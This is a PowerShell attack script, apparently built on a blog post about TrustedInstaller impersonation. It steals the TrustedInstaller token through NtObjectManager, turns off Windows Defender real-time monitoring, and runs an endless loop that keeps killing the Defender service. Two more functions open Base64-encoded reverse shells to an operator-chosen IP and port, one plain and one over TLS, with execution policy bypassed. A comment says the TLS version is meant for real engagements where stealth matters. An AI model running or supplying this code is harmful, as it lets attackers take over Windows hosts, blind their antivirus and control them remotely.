# Source: https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html

Import-Module .\NtObjectManager.psm1

# Steals the TrustedInstaller process token to elevate privileges
# Works for any user with SeImpersonatePrivilege and/or SeDebugPrivilege enabled

function Invoke-TrustedInstaller {
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

    # Start the TI service
    Start-Service TrustedInstaller

    # Extract the TI thread object
    $ti = Get-NtProcess -Name 'TrustedInstaller.exe'
    $ti_thread = $ti.GetFirstThread()

    # Impersonate the TI thread token
    $current = Get-NtThread -Current -PseudoHandle
    $imp = $current.ImpersonateThread($ti_thread)

    # Disable real-time monitoring as TI so that even admins don't have permission to re-enable it
    Set-MpPreference -DisableRealtimeMonitoring $true -Force

    # Start a background job consisting of an infinite loop that keeps killing the Windows Defender service
    # you need TI privileges to do this
    $ps = Start-Job -ScriptBlock {
        while ($true) {
            cmd.exe /c "taskkill /f /im MsMpSvc.exe"
        }
    }
    
    Disconnect-Job -Job $ps

    # Print proof that we've successfully impersonated TI
    $imp_token = Get-NtToken -Impersonation
    $imp_token.Groups | Where-Object { $_.Sid.name -match 'TrustedInstaller' }
}

# Spawns a Base64 reverse shell with TI privileges using 'powershell -ep bypass -e'
# Usage: Invoke-TIRevShell -IP <IP> -Port <Port>
# Can be used offline, so more suitable for CTF environments

function Invoke-TIRevShell {
    param(
        [Parameter(Mandatory, Position = 0, ValueFromPipeline)]
        [string]$IP,

        [Parameter(Mandatory, Position = 1, ValueFromPipeline)]
        [int]$Port
    )

    Invoke-TrustedInstaller

    $shell = '$client = New-Object System.Net.Sockets.TCPClient('
    $shell += $IP
    $shell += ', '
    $shell += ''
    $shell += $Port
    $shell += ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
    $shell += '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS "'
    $shell += ' + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    $psbin = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
    $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))

    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded" -NoNewWindow
}

# Spawns a TLS-encrypted Base64 reverse shell with TI privileges using 'powershell -ep bypass -e'
# Requires an Internet connection, so not going to be used in any CTF environments,
# but useful for real engagements where OPSEC is more important.

function Invoke-TIRevShellTLS {
    param(
        [Parameter(Mandatory, Position = 0, ValueFromPipeline)]
        [string]$IP,

        [Parameter(Mandatory, Position = 1, ValueFromPipeline)]
        [int]$Port
    )

    Invoke-TrustedInstaller

    $shell = '$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('
    $shell += $IP
    $shell += ', '
    $shell += $Port
    $shell += ');$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('
    $shell += 'cloudflare-dns.com'
    $shell += ',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + '
    $shell += 'SHELL> '
    $shell += ');$StreamWriter.Flush()};WriteToStream'
    $shell += ''
    $shell += ';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'

    $psbin = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
    $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))

    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded" -NoNewWindow
}